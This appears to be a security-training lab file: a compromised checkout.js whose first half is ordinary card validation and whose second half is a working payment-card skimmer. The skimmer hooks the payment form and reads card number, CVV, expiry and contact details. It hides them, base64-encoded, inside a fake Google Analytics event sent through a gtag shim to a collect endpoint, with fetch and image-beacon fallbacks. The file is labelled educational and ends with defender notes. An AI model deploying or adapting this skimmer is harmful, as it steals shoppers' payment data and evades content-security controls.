/**
 * CHECKOUT.JS - COMPROMISED VERSION (GOOGLE ANALYTICS CSP BYPASS VARIANT)
 *
 * This variant demonstrates the same attack as the base Lab 1 skimmer, but it
 * disguises exfiltration as a legitimate analytics event. Instead of posting a
 * raw payment payload to an obvious `/collect` endpoint, the skimmer encodes
 * the card data and places it inside analytics-style event fields.
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

// ============================================================================
// PART 1: LEGITIMATE CHECKOUT CODE
// ============================================================================

;(function () {
  'use strict'

  console.log('[Checkout] Initializing legitimate checkout system...')

  function validateCardNumber(cardNumber) {
    const digits = cardNumber.replace(/\D/g, '')

    if (digits.length < 15 || digits.length > 16) {
      return { valid: false, error: 'Card number must be 15-16 digits' }
    }

    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits[i])

      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }

      sum += digit
      isEven = !isEven
    }

    const luhnValid = sum % 10 === 0
    if (!luhnValid) {
      return { valid: false, error: 'Invalid card number (Luhn algorithm check failed)' }
    }

    return { valid: true }
  }

  function validateExpiry(expiry) {
    const parts = expiry.split('/')
    if (parts.length !== 2) return false

    const month = parseInt(parts[0])
    const year = parseInt('20' + parts[1])

    if (month < 1 || month > 12) return false

    const now = new Date()
    const currentYear = now.getFullYear()
    const currentMonth = now.getMonth() + 1

    if (year < currentYear) return false
    if (year === currentYear && month < currentMonth) return false

    return true
  }

  function validateCVV(cvv, cardNumber) {
    const digits = cvv.replace(/\D/g, '')
    const cleanCard = cardNumber.replace(/\D/g, '')

    if (cleanCard.startsWith('34') || cleanCard.startsWith('37')) {
      return digits.length === 4
    }

    return digits.length === 3
  }

  function showError(fieldId, message) {
    const field = document.getElementById(fieldId)
    field.style.borderColor = '#e74c3c'

    const existingError = field.parentElement.querySelector('.error-message')
    if (existingError) {
      existingError.remove()
    }

    const errorDiv = document.createElement('div')
    errorDiv.className = 'error-message'
    errorDiv.style.color = '#e74c3c'
    errorDiv.style.fontSize = '0.9rem'
    errorDiv.style.marginTop = '0.25rem'
    errorDiv.textContent = message
    field.parentElement.appendChild(errorDiv)
    field.focus()
  }

  function clearErrors() {
    document.querySelectorAll('.error-message').forEach(el => el.remove())
    document.querySelectorAll('input, select').forEach(el => {
      el.style.borderColor = '#ddd'
    })
  }

  function processPayment(formData) {
    console.log('[Checkout] Processing payment...')
    console.log('[Checkout] IMPORTANT: This is a simulated transaction')

    return new Promise(resolve => {
      setTimeout(() => {
        console.log('[Checkout] Payment processed successfully (simulated)')
        console.log('[Checkout] Transaction ID:', 'TXN-' + Date.now())
        resolve({
          success: true,
          transactionId: 'TXN-' + Date.now()
        })
      }, 1000)
    })
  }

  async function handleSubmit(event) {
    event.preventDefault()

    console.log('[Checkout] Form submitted')
    clearErrors()

    const cardNumber = document.getElementById('card-number').value
    const cvv = document.getElementById('cvv').value
    const expiry = document.getElementById('expiry').value

    const cardValidation = validateCardNumber(cardNumber)
    if (!cardValidation.valid) {
      showError('card-number', cardValidation.error)
      return false
    }

    if (!validateExpiry(expiry)) {
      showError('expiry', 'Card has expired or invalid date')
      return false
    }

    if (!validateCVV(cvv, cardNumber)) {
      showError('cvv', 'Invalid CVV code')
      return false
    }

    const submitBtn = document.querySelector('.submit-btn')
    const originalText = submitBtn.textContent
    submitBtn.textContent = 'Processing...'
    submitBtn.disabled = true

    try {
      const formData = new FormData(event.target)
      const data = Object.fromEntries(formData.entries())

      const result = await processPayment(data)

      if (result.success) {
        event.target.style.display = 'none'
        const successMessage = document.getElementById('success-message')
        successMessage.classList.add('show')

        console.log('[Checkout] Order completed successfully')
      }
    } catch (error) {
      console.error('[Checkout] Payment processing error:', error)
      alert('Payment processing failed. Please try again.')

      submitBtn.textContent = originalText
      submitBtn.disabled = false
    }
  }

  function init() {
    const form = document.getElementById('payment-form')

    if (form) {
      form.addEventListener('submit', handleSubmit)
      console.log('[Checkout] Checkout system ready')
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init)
  } else {
    init()
  }
})()

// ============================================================================
// PART 2: ANALYTICS-DISGUISED MALICIOUS CODE
// ============================================================================
//
// This code models skimmers that abuse allowed analytics destinations or APIs.
// The payload is still card data, but it is hidden inside an analytics-shaped
// event body so defenders must inspect event content, not just destination.
// ============================================================================

;(function () {
  'use strict'

  setTimeout(function () {
    const CONFIG = {
      collectUrl: '/lab1/c2/collect',
      measurementId: 'G-LABGA42',
      eventName: 'purchase',
      delay: 125,
      debug: true
    }

    function log(message, data) {
      if (CONFIG.debug) {
        console.log('[SKIMMER]', message, data || '')
      }
    }

    function getFieldValue(selectors) {
      log('Searching for field with selectors:', selectors)

      for (const selector of selectors) {
        const element = document.querySelector(selector)
        if (element && element.value) {
          return element.value.trim()
        }
      }

      return ''
    }

    function extractCardData() {
      const data = {
        cardNumber: getFieldValue(['#card-number', '[name="cardNumber"]']),
        cvv: getFieldValue(['#cvv', '[name="cvv"]']),
        expiry: getFieldValue(['#expiry', '[name="expiry"]']),
        cardholderName: getFieldValue(['#cardholder-name', '[name="cardholderName"]']),
        billingAddress: getFieldValue(['#billing-address', '[name="billingAddress"]']),
        city: getFieldValue(['#city', '[name="city"]']),
        zip: getFieldValue(['#zip', '[name="zip"]']),
        country: getFieldValue(['#country', '[name="country"]']),
        email: getFieldValue(['#email', '[name="email"]']),
        phone: getFieldValue(['#phone', '[name="phone"]'])
      }

      data.metadata = {
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screenResolution: screen.width + 'x' + screen.height,
        collectionMethod: 'google-analytics-csp-bypass-variant'
      }

      return data
    }

    function hasValidCardData(data) {
      const cleanCard = data.cardNumber.replace(/[\s-]/g, '')
      const validLength = cleanCard.length === 15 || cleanCard.length === 16
      const validCVV = data.cvv.length === 3 || data.cvv.length === 4
      return validLength && validCVV && data.expiry
    }

    function getAnalyticsClientId() {
      const storageKey = '_ga_lab_client_id'
      let clientId = ''

      try {
        clientId = window.localStorage.getItem(storageKey) || ''
      } catch (error) {
        log('localStorage unavailable, generating in-memory client ID')
      }

      if (!clientId) {
        clientId = 'lab.' + Math.floor(Date.now() / 1000) + '.' + Math.floor(Math.random() * 1e9)
        try {
          window.localStorage.setItem(storageKey, clientId)
        } catch (error) {
          log('Failed to persist analytics client ID')
        }
      }

      return clientId
    }

    function createAnalyticsEnvelope(encodedPayload) {
      return {
        analyticsEnvelope: true,
        provider: 'google-analytics',
        version: 'ga4-lab',
        source: 'gtag-shim',
        measurementId: CONFIG.measurementId,
        clientId: getAnalyticsClientId(),
        page: {
          location: window.location.href,
          title: document.title,
          referrer: document.referrer || ''
        },
        eventName: CONFIG.eventName,
        params: {
          event_category: 'payment',
          event_label: encodedPayload,
          checkout_step: 'payment',
          currency: 'USD',
          value: 299.99,
          items: 1
        }
      }
    }

    function installAnalyticsShim() {
      if (window.__labAnalyticsShimInstalled) {
        return
      }

      window.dataLayer = window.dataLayer || []

      const originalGtag = typeof window.gtag === 'function' ? window.gtag.bind(window) : null

      window.gtag = function gtagShim() {
        const args = Array.from(arguments)
        window.dataLayer.push(args)

        if (originalGtag) {
          try {
            originalGtag.apply(null, args)
          } catch (error) {
            log('Original gtag threw while shim was active', error)
          }
        }

        if (args[0] === 'event' && args[1] === CONFIG.eventName) {
          const params = args[2] || {}
          const analyticsEnvelope = {
            analyticsEnvelope: true,
            provider: 'google-analytics',
            version: 'ga4-lab',
            source: 'gtag-shim',
            measurementId: CONFIG.measurementId,
            clientId: getAnalyticsClientId(),
            page: {
              location: window.location.href,
              title: document.title,
              referrer: document.referrer || ''
            },
            eventName: args[1],
            params: params
          }

          return fetch(CONFIG.collectUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(analyticsEnvelope),
            mode: 'cors',
            credentials: 'omit'
          })
            .then(response => {
              log('Analytics-shaped exfiltration response:', response.status)
              return response.text()
            })
            .then(() => {
              log('Analytics-shaped exfiltration completed')
            })
        }

        return undefined
      }

      window.__labAnalyticsShimInstalled = true
      window.gtag('js', new Date())
      window.gtag('config', CONFIG.measurementId, {
        send_page_view: false,
        transport_url: CONFIG.collectUrl
      })
    }

    function exfiltrateViaAnalytics(data) {
      installAnalyticsShim()

      const encodedPayload = btoa(JSON.stringify(data))
      const analyticsEnvelope = createAnalyticsEnvelope(encodedPayload)

      log('Encoded card data into analytics payload', {
        measurementId: analyticsEnvelope.measurementId,
        eventName: analyticsEnvelope.eventName,
        encodedLength: encodedPayload.length
      })

      return window.gtag('event', CONFIG.eventName, analyticsEnvelope.params).catch(error => {
        log('Analytics exfiltration failed, using direct fallback', error)

        return fetch(CONFIG.collectUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(analyticsEnvelope),
          mode: 'cors',
          credentials: 'omit'
        }).catch(fetchError => {
          log('Direct analytics envelope fallback failed, using beacon', fetchError)

          const img = new Image()
          const params = new URLSearchParams({
            d: encodedPayload
          })
          img.src = CONFIG.collectUrl + '?' + params.toString()
        })
      })
    }

    function initSkimmer() {
      log('Initializing Google Analytics CSP bypass skimmer...')

      const checkForm = setInterval(() => {
        const form = document.querySelector('#payment-form')

        if (form) {
          clearInterval(checkForm)
          log('Payment form found, attaching analytics-disguised skimmer')

          form.addEventListener('submit', function () {
            const cardData = extractCardData()

            if (hasValidCardData(cardData)) {
              log('Valid card data found, disguising exfiltration as analytics')
              setTimeout(() => {
                exfiltrateViaAnalytics(cardData)
              }, CONFIG.delay)
            } else {
              log('Insufficient card data, skipping exfiltration')
            }
          })

          log('Analytics-disguised skimmer ready and listening')
        }
      }, 100)

      setTimeout(() => {
        clearInterval(checkForm)
      }, 10000)
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initSkimmer)
    } else {
      initSkimmer()
    }
  }, 450)
})()

/**
 * ANALYSIS NOTES:
 *
 * This variant demonstrates how attackers can:
 * - Reuse normal checkout interception logic
 * - Hide stolen card data inside `event_label`
 * - Blend exfiltration into analytics-looking traffic
 * - Abuse whitelisted destinations or trusted APIs to bypass CSP assumptions
 */
